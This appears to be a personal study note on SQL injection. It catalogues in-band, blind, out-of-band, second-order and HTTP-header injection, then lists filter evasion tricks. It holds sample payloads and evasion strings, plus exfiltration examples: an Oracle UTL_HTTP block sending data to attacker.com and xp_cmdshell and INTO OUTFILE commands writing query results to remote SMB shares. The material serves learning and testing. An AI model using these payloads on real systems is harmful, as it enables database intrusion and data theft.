#SQL #WebInjection #HTTP #DNS #SMB #WEB

# Type of attacks

![[SQL_Attacks.svg]]

## In-band SQL Injection

Most common and straightforward type of SQL injection attack. 
*The attacker uses the same communication channel for both the injection and the retrieval of data.*  
**Easy to exploit and detect but noisy and can be easily monitored.**

- **Error-Based SQL Injection**: The attacker manipulates the SQL query to produce error messages from the database. 
	- Example: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. If the database version is returned in the error message, it reveals information about the database.
	
- **Union-Based SQL Injection**: The attacker uses the UNION operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables. 
	- Example: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.

## Inferential (Blind) SQL Injection  

Does not transfer data directly through the web application.  
*The attacker sends payloads and observes the application’s behavior and response times to infer information about the database.*
**More challenging to exploit and requires multiple requests but can be used when detailed error messages are unavailable.**

- **Boolean-Based Blind SQL Injection**: The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. 
	- Example: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`. 
	- Check if the page content or behavior changes based on the condition.

- **Time-Based Blind SQL Injection**:  Delays the response for a specified time if the condition is true. 
	- Example, `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`. 
  
## Out-of-band SQL Injection

Out-of-band SQL injection is used when the attacker cannot use the same channel to launch the attack and gather results.
*The database server needs to make an out-of-band request (e.g., HTTP or DNS) to send the query result to the attacker.*
**Less common and highly effective, requires external server control, and relies on the database’s ability to make out-of-band requests.**

Useful in network environments with limited direct connectivity between the attacker and the database server, such as when the server is behind a firewall or in a different network segment.

#### MySQL and MariaDB
In #MySQL or #MariaDB, Out-of-band SQL injection can be achieved using [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) or [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) command. This command allows an attacker to write the results of a query to a file on the server's filesystem. 

 ```sql
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

**HTTP**: ***MySQL and MariaDB*** do not natively support HTTP requests, this can be done through external scripts or ***User Defined Functions (UDFs)*** if the database is configured to allow such operations.

**DNS**: MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom ***User-Defined Functions (UDFs)*** or system-level scripts

**SMB**: Exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`
[[Linux - Process Cheat sheet|See cheat sheet to build SMB share]]

#### Microsoft SQL Server (MSSQL)
In #MSSQL, Out-of-band SQL injection can be performed using features like [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:

 ```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.  

#### Oracle 
In #Oracle databases, Out-of-band SQL injection can be executed using the [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) or [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:

```SQL
DECLARE   
	req UTL_HTTP.REQ;   
	resp UTL_HTTP.RESP; 
BEGIN   
	req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);   
	UTL_HTTP.GET_RESPONSE(req); 
END;
```
 
## Second Order SQL injection

*A vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing*
**The injection occurs upon the second use of the data when it is retrieved and used in a SQL command**

A query to interact with a bookstore could be :
```sql
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
```

And we would insert the payload to be processed in future queries:
```SQL
12345'; UPDATE books SET book_name = 'Hacked'; --
```

**Initially escaped but then executed**

## HTTP Header Injection

*HTTP headers can carry user input, which might be used in SQL queries on the server side*
==EX:==
```HTTP
User-Agent: ' UNION SELECT username, password FROM user; --
```

---
# Filter Evasion techniques

## Character Encoding

- **URL Encoding**: 
For example, the payload `' OR 1=1--` can be encoded as `%27%20OR%201%3D1--`. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognize it as malicious during initial processing.

- **Hexadecimal Encoding**: 
For instance, the query `SELECT * FROM users WHERE name = 'admin'` can be encoded as `SELECT * FROM users WHERE name = 0x61646d696e`. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.

- **Unicode Encoding**: 
For example, the string `admin` can be encoded as `\u0061\u0064\u006d\u0069\u006e`. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.

## Input replacing

If keywords like : `OR, AND, WHERE...` are escaped.

To bypass the filtering Here is the example payload 
```sql
Cleartext: 1' || 1=1 --+
```
```SQL
Encoded : 1%27%20||%201=1%20--+
```

- `%27` is the URL encoding for the single quote (').
- `%20` is the URL encoding for a space ( ).
- `||` represents the SQL OR operator.
- `%3D` is the URL encoding for the equals sign (=).
- `%2D%2D` is the URL encoding for --, which starts a comment in SQL.

## No-Quote SQL Injection

**Used when the application filters single or double quotes or escapes.**

- **Using Numerical Values**: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting `' OR '1'='1`, an attacker can use `OR 1=1` in a context where quotes are not necessary. 

- **Using SQL Comments**: Another method involves using SQL comments to terminate the rest of the query. For instance, the input `admin'--` can be transformed into `admin--`, where the `--` signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.

- **Using CONCAT() Function**: Attackers can use SQL functions like `CONCAT()` to construct strings without quotes. For example, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string admin. The `CONCAT()` function and similar methods allow attackers to build strings without directly using quotes.

## No Spaces Allowed

**When spaces are not allowed or are filtered out**

- **Comments to Replace Spaces**: One common method is to use SQL comments (`/**/`) to replace spaces. For example, instead of `SELECT * FROM users WHERE name = 'admin'`, an attacker can use `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. 

- **Tab or Newline Characters**: Another approach is using tab (`\t`) or newline (`\n`) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`.

- **Alternate Characters**: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space). These characters can replace spaces in the payload.

## Filtering bypass overview

|   |   |   |
|---|---|---|
|**Scenario**|**Description**|**Example**|
|**Keywords like SELECT are banned**|SQL keywords can often be bypassed by changing their case or adding inline comments to break them up|SElEcT * FrOm users or SE/**/LECT * FROM/**/users|
|**Spaces are banned**|Using alternative whitespace characters or comments to replace spaces can help bypass filters.|SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users|
|**Logical operators like AND, OR are banned**|Using alternative logical operators or concatenation to bypass keyword filters.|username = 'admin' && password = 'password' or username = 'admin'/**/\|/**/1=1 --|
|**Common keywords like UNION, SELECT are banned**|Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.|SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)|
|**Specific keywords like OR, AND, SELECT, UNION are banned**|Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments.|SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users|

---

# Tools

[[(3) SQL Injection - Tools|Tools]]